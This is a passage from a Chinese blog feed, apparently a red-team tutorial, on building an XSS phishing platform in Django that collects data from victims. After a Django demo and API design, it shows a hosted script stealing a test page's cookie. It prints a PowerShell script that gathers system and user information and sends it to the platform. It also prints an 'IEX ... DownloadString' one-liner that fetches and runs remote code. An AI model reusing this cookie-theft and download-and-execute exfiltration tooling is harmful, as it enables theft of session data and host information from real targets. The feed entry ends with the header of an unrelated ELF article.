了解一些？</p></li><li><p><strong>缓存怎么做？</strong> Django Cache 了解一下？</p></li></ul><p>虽然我们整体架构都是自己纯手撸，使用Flask会更适合我们，但是大家有没有听过一句话：<strong>我可以不用，但是我不能没有（逃</strong></p><h3 id="Django简单演示"><a href="#Django简单演示" class="headerlink" title="Django简单演示"></a>Django简单演示</h3><h4 id="首先创建一个项目"><a href="#首先创建一个项目" class="headerlink" title="首先创建一个项目"></a>首先创建一个项目</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 django-admin.py  startproject demo</span><br></pre></td></tr></table></figure><p>项目中只有3个函数</p><ul><li>显示文本</li><li>加法运算</li><li>加法运算后写入数据库</li></ul><h4 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">├── demo</span><br><span class="line">│   ├── asgi.py   </span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── settings.py</span><br><span class="line">│   ├── urls.py</span><br><span class="line">│   ├── wsgi.py</span><br><span class="line">│   └── XSS</span><br><span class="line">│       ├── __init__.py</span><br><span class="line">│       └── test.py</span><br><span class="line">├── manage.py</span><br><span class="line">├── Database.py</span><br><span class="line">└── xss.db</span><br></pre></td></tr></table></figure><p>在这结构中我们只需要关这三个文件</p><ul><li><p><code>Database.py</code>数据库写入相关文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetRootFileLocation</span>:</span>  <span class="comment"># 获取当前文件路径类</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Result</span>(<span class="params">self</span>) -&gt; str:</span></span><br><span class="line">        system_type = sys.platform</span><br><span class="line">        <span class="keyword">if</span> system_type == <span class="string">&quot;win32&quot;</span> <span class="keyword">or</span> system_type == <span class="string">&quot;cygwin&quot;</span>:</span><br><span class="line">            RootFileLocation = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> RootFileLocation</span><br><span class="line">        <span class="keyword">elif</span> system_type == <span class="string">&quot;linux&quot;</span> <span class="keyword">or</span> system_type == <span class="string">&quot;darwin&quot;</span>:</span><br><span class="line">            RootFileLocation = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> RootFileLocation</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetDatabaseFilePath</span>:</span>  <span class="comment"># 数据库文件路径返回值</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">result</span>(<span class="params">self</span>) -&gt; str:</span></span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&quot;win32&quot;</span> <span class="keyword">or</span> sys.platform == <span class="string">&quot;cygwin&quot;</span>:</span><br><span class="line">            DatabaseFilePath = GetRootFileLocation().Result() + <span class="string">&quot;\\xss.db&quot;</span></span><br><span class="line">            <span class="keyword">return</span> DatabaseFilePath</span><br><span class="line">        <span class="keyword">elif</span> sys.platform == <span class="string">&quot;linux&quot;</span> <span class="keyword">or</span> sys.platform == <span class="string">&quot;darwin&quot;</span>:</span><br><span class="line">            DatabaseFilePath = GetRootFileLocation().Result() + <span class="string">&quot;/xss.db&quot;</span></span><br><span class="line">            <span class="keyword">return</span> DatabaseFilePath</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdditionOperation</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.con = sqlite3.connect(GetDatabaseFilePath().result())</span><br><span class="line">        <span class="comment"># 获取所创建数据的游标</span></span><br><span class="line">        self.cur = self.con.cursor()</span><br><span class="line">        <span class="comment"># 创建表</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.cur.execute(<span class="string">&quot;CREATE TABLE AdditionOperation\</span></span><br><span class="line"><span class="string">                                (id INTEGER PRIMARY KEY,\</span></span><br><span class="line"><span class="string">                                a TEXT NOT NULL,\</span></span><br><span class="line"><span class="string">                                b TEXT NOT NULL,\</span></span><br><span class="line"><span class="string">                                calculation result TEXT NOT NULL)&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Write</span>(<span class="params">self, **kwargs</span>) -&gt; bool or <span class="keyword">None</span>:</span>  <span class="comment"># 写入相关信息</span></span><br><span class="line"></span><br><span class="line">        A = kwargs.get(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">        B = kwargs.get(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.cur.execute(<span class="string">&quot;INSERT INTO AdditionOperation(a,b,calculation)\</span></span><br><span class="line"><span class="string">                VALUES (?,?,?)&quot;</span>, (A,B,<span class="built_in">int</span>(A)+<span class="built_in">int</span>(B),))</span><br><span class="line">            <span class="comment"># 提交</span></span><br><span class="line">            self.con.commit()</span><br><span class="line">            self.con.close()</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></li><li><p><code>urls.py</code>路由表，用来表示连接和路由的关系</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> demo.XSS.test <span class="keyword">import</span> SayHello,Add,AddToDatabase</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;sey_hello/&#x27;</span>, SayHello),</span><br><span class="line">    path(<span class="string">&#x27;add/&#x27;</span>, Add),</span><br><span class="line">    path(<span class="string">&#x27;add_to_database/&#x27;</span>, AddToDatabase),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p><code>test.py</code>演示的三个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> Database <span class="keyword">import</span> AdditionOperation</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SayHello</span>(<span class="params">request</span>):</span><span class="comment">#判断请求方式后说你好</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Hello this is POST~&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Hello this is GET&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">request</span>):</span><span class="comment">#进行加法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        A = json.loads(request.body)[<span class="string">&quot;a&quot;</span>]</span><br><span class="line">        B = json.loads(request.body)[<span class="string">&quot;b&quot;</span>]</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="built_in">int</span>(A)+<span class="built_in">int</span>(B), <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;请使用POST！&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, &#125;)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;a&quot;: &quot;1&quot;,</span></span><br><span class="line"><span class="string">&quot;b&quot;: &quot;2&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddToDatabase</span>(<span class="params">request</span>):</span><span class="comment">#进行加法后写入数据库</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        A = json.loads(request.body)[<span class="string">&quot;a&quot;</span>]</span><br><span class="line">        B = json.loads(request.body)[<span class="string">&quot;b&quot;</span>]</span><br><span class="line">        AdditionOperation().Write(a=A,b=B)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="built_in">int</span>(A)+<span class="built_in">int</span>(B), <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;请使用POST！&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, &#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="演示效果"><a href="#演示效果" class="headerlink" title="演示效果"></a>演示效果</h4><p>在文件更目录启动项目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py runserver <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">9999</span> --insecure   </span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/2.gif" alt="1"></p><p>可以看到数据库文件中也写入了相关数据</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/3.png" alt="image-20210108160831363"></p><h2 id="平台设计"><a href="#平台设计" class="headerlink" title="平台设计"></a>平台设计</h2><h3 id="项目关系图"><a href="#项目关系图" class="headerlink" title="项目关系图"></a>项目关系图</h3><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/4.png" alt="图片1"></p><h3 id="项目的逻辑"><a href="#项目的逻辑" class="headerlink" title="项目的逻辑"></a>项目的逻辑</h3><p>除去存放类函数的文件和用户认证文件，整体的文件逻辑如下图</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/5.png" alt="image-20210108135555397"></p><h3 id="API接口"><a href="#API接口" class="headerlink" title="API接口"></a>API接口</h3><p>一个XSS平台在不考虑用户登录的情况下，只需要<strong>11</strong>个API接口以及<strong>3</strong>张表即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">接收数据：&#x2F;a&#x2F;xxxxx</span><br><span class="line">加载文件：&#x2F;s&#x2F;xxxxx</span><br><span class="line">创建跨站脚本钓鱼项目：&#x2F;api&#x2F;create_cross_site_script_project&#x2F; </span><br><span class="line">查询跨站脚本钓鱼项目：&#x2F;api&#x2F;query_cross_site_script_project&#x2F;</span><br><span class="line">查询跨站脚本钓鱼项目接收的数据：&#x2F;api&#x2F;query_cross_site_script_project_data&#x2F;</span><br><span class="line">读取用户自定义跨站脚本模板数据：&#x2F;api&#x2F;read_cross_site_script_template&#x2F;</span><br><span class="line">读取默认跨站脚本模板数据：&#x2F;api&#x2F;read_default_cross_site_script_template&#x2F;</span><br><span class="line">保存用户自定义跨站脚本模板数据：&#x2F;api&#x2F;save_cross_site_script_template&#x2F;</span><br><span class="line">修改用户自定义跨站脚本模板数据：&#x2F;api&#x2F;modify_cross_site_script_template&#x2F;</span><br><span class="line">修改跨站脚本钓鱼项目：&#x2F;api&#x2F;modify_cross_site_script_project&#x2F;</span><br><span class="line">查询跨站脚本钓鱼项目的详细信息：&#x2F;api&#x2F;query_cross_site_script_project_info</span><br></pre></td></tr></table></figure><p>Django中路由表(urls.py)显示如下：</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/6.png" alt="image-20210108135851293"></p><h3 id="数据库表"><a href="#数据库表" class="headerlink" title="数据库表"></a>数据库表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">存放接收数据表：CrossSiteScript</span><br><span class="line">存放项目信息表：CrossSiteScriptProject</span><br><span class="line">存放自定义模板表：CrossSiteScriptTemplate</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/7.png" alt="image-20210108140227379"></p><h3 id="函数讲解"><a href="#函数讲解" class="headerlink" title="函数讲解"></a>函数讲解</h3><p>该模块所有函数逻辑结构都相同，为了不浪费大家的时间，当前就挑选一个生产项目的函数出来讲解，如果想了解各个接口相关参数可以查阅<a href="http://medusa.ascotbe.com/Documentation/#/API/CrossSiteScript">文档</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GenerateProject</span>(<span class="params">request</span>):</span><span class="comment">#用来生成项目，并且生成文件和用户绑定</span></span><br><span class="line">    RequestLogRecord(request, request_api=<span class="string">&quot;create_cross_site_script_project&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            JavaScriptFileData = json.loads(request.body)[<span class="string">&quot;javascript_data&quot;</span>]<span class="comment">#获取前端传入的加密过的js文件数据</span></span><br><span class="line">            ProjectName = json.loads(request.body)[<span class="string">&quot;project_name&quot;</span>]<span class="comment">#用户自定义的项目名</span></span><br><span class="line">            UserToken = json.loads(request.body)[<span class="string">&quot;token&quot;</span>]</span><br><span class="line">            Uid = UserInfo().QueryUidWithToken(UserToken)  <span class="comment"># 如果登录成功后就来查询用户名</span></span><br><span class="line">            <span class="keyword">if</span> Uid != <span class="literal">None</span> <span class="keyword">and</span> JavaScriptFileData!=<span class="literal">None</span>:  <span class="comment"># 查到了UID,并且js数据不为空</span></span><br><span class="line">                UserOperationLogRecord(request, request_api=<span class="string">&quot;create_cross_site_script_project&quot;</span>, uid=Uid)</span><br><span class="line">                GetJavaScriptFilePath().Result()<span class="comment">#获取js文件路径</span></span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:<span class="comment">#如果查询确实冲突了</span></span><br><span class="line">                    JavaScriptSaveFileName=randoms().result(<span class="number">5</span>)<span class="comment">#文件名</span></span><br><span class="line">                    QueryJavaScriptSaveFileNameValidity = CrossSiteScriptProject().RepeatInvestigation(file_name=JavaScriptSaveFileName)<span class="comment">#判断文件是否重复</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> QueryJavaScriptSaveFileNameValidity:<span class="comment">#如果不冲突的话跳出循环</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                JavaScriptSaveRoute = GetJavaScriptFilePath().Result() + JavaScriptSaveFileName  <span class="comment"># 获得保存路径</span></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(JavaScriptSaveRoute, <span class="string">&#x27;w+&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(base64.b64decode(<span class="built_in">str</span>(JavaScriptFileData).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))<span class="comment">#文件内容还要加密</span></span><br><span class="line">                CrossSiteScriptProject().Write(file_name=JavaScriptSaveFileName,uid=Uid,project_name=ProjectName)<span class="comment">#写到数据库表中</span></span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: JavaScriptSaveFileName, <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)<span class="comment">#返回创建好的文件名</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&quot;小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧&quot;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">403</span>, &#125;)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            ErrorLog().Write(<span class="string">&quot;Web_CrossSiteScriptHub_CrossSiteScript_GenerateProject(def)&quot;</span>, e)</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;呐呐呐！莎酱被玩坏啦(&gt;^ω^&lt;)&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">169</span>, &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;请使用Post请求&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, &#125;)</span><br></pre></td></tr></table></figure><ul><li><code>RequestLogRecord</code>和<code>UserOperationLogRecord</code>函数是用户行为判断使用的的</li><li><code>UserInfo().QueryUidWithToken(UserToken)</code>是对用户传入的token进行权限验证的</li><li><code>ErrorLog().Write()</code>是对报错日志进行一个写入操作的，这几个函数都不用去管它，这不在我们的介绍中</li></ul><p>1.首先函数通过判断用户的请求方式</p><p>2.当用户使用POST的时候，进行用户传入<code>project_name</code>、<code>javascript_data</code>、<code>token</code>三个值的获取</p><p>3.通过获取到的<code>token</code>值进行查询用户的UID值</p><p>4.如果UID不为空且传入的<code>javascript_data</code>值不为空，进行文件名生成</p><p>5.当文件名不冲突的时候进行拼接写入到本地，并且传入到数据库中</p><h2 id="效果演示"><a href="#效果演示" class="headerlink" title="效果演示"></a>效果演示</h2><h3 id="设置靶机"><a href="#设置靶机" class="headerlink" title="设置靶机"></a>设置靶机</h3><p>用PHPstudy快速搭建一个受害者机器，利用php来生成一个cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;分享demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Hello world&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;hacker by ascotbe&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/8.png" alt="image-20210108144136426"></p><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p>创建好需要替换掉文本中的ip和项目文件地址这两个参数</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/9.gif" alt="2"></p><h3 id="构建POC"><a href="#构建POC" class="headerlink" title="构建POC"></a>构建POC</h3><p>接着我们在靶机上面添加XSS内容，IP填你的域名或者你后端的地址</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/10.png" alt="image-20210108160245965"></p><h3 id="查看效果"><a href="#查看效果" class="headerlink" title="查看效果"></a>查看效果</h3><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/11.gif" alt="3"></p><p>可以看到上图<strong>1.php</strong>文件生成了一个cookie，然后加载了云端的js脚本，最后像云端发送了数据</p><h2 id="其他用法"><a href="#其他用法" class="headerlink" title="其他用法"></a>其他用法</h2><p>其实很多时候当目标机器可以无回显执行命令时使用，我们用的dnslog来获取数据会很慢，还可以通过powershell获取数据</p><h3 id="创建项目-1"><a href="#创建项目-1" class="headerlink" title="创建项目"></a>创建项目</h3><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/12.png" alt="image-20210108170533024"></p><p>这边把js文件内容替换成powershell命令，然后创建项目</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Desktop</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Desktop</span><br><span class="line"><span class="variable">$BIOS</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_BIOS</span><br><span class="line"><span class="variable">$Processor</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Processor | <span class="built_in">Select-Object</span> <span class="literal">-ExcludeProperty</span> <span class="string">&quot;CIM*&quot;</span></span><br><span class="line"><span class="variable">$QuickFixEngineering</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_QuickFixEngineering</span><br><span class="line"><span class="variable">$OperatingSystem</span> =<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_OperatingSystem | <span class="built_in">Select-Object</span> <span class="literal">-Property</span> Build*,OSType,ServicePack*</span><br><span class="line"><span class="variable">$LogicalDisk</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_LogicalDisk <span class="literal">-Filter</span> <span class="string">&quot;DriveType=3&quot;</span></span><br><span class="line"><span class="variable">$ComputerSystem</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_ComputerSystem <span class="literal">-Property</span> UserName</span><br><span class="line"><span class="variable">$R</span> = <span class="built_in">Invoke-WebRequest</span> <span class="literal">-URI</span> http://ip/a/项目文件名/?Desktop=<span class="variable">$Desktop</span><span class="string">&quot;&amp;&quot;</span>BIOS=<span class="variable">$BIOS</span><span class="string">&quot;&amp;&quot;</span>Processor=<span class="variable">$Processor</span><span class="string">&quot;&amp;&quot;</span>ComputerSystem=<span class="variable">$ComputerSystem</span><span class="string">&quot;&amp;&quot;</span><span class="variable">$QuickFixEngineering</span>=QuickFixEngineering<span class="string">&quot;&amp;&quot;</span>OperatingSystem=<span class="variable">$OperatingSystem</span><span class="string">&quot;&amp;&quot;</span>LogicalDisk=<span class="variable">$LogicalDisk</span> </span><br></pre></td></tr></table></figure><h3 id="运行演示"><a href="#运行演示" class="headerlink" title="运行演示"></a>运行演示</h3><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.WebClient).DownloadString(&quot;http:&#x2F;&#x2F;10.91.212.184:9999&#x2F;s&#x2F;eeUZF&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/13.gif" alt="4"></p><h2 id="总结思考"><a href="#总结思考" class="headerlink" title="总结思考"></a>总结思考</h2><p>大部分白帽子测试漏洞就是进行一个普通弹窗演示，但是正常打红队，想要获取目标客服的一些信息的时候，由于信任以及网址被WAF拦截等情况，导致各种问题，并且无开源项目</p><p>本文介绍了一个XSS平台从头到尾的诞生，以及利用原理，虽然代码没有具体详细讲解，主要是太过于枯燥，感兴趣的师傅直接看项目源码就能够看懂，几乎是每一行都有注释，项目整体一个大的模块写下来花了小半个月时间，虽然功能不多，但是当时想写一个这个模块的时候，无从下手只能去看网上别人搭建的平台，通过注册抓包看逻辑结构，进行理解。每次动手写东西的时候都能收获许多东西，多学多谢才能从开发的角度去找漏洞。</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux ELF格式解析</title>
    <link href="https://www.ascotbe.com/2020/12/06/ExecutableLinkableFormat/"/>
    <id>https://www.ascotbe.com/2020/12/06/ExecutableLinkableFormat/</id>
    <published>2020-12-06T15:45:42.000Z</published>
    <updated>2021-07-05T01:53:25.063Z</updated>
    
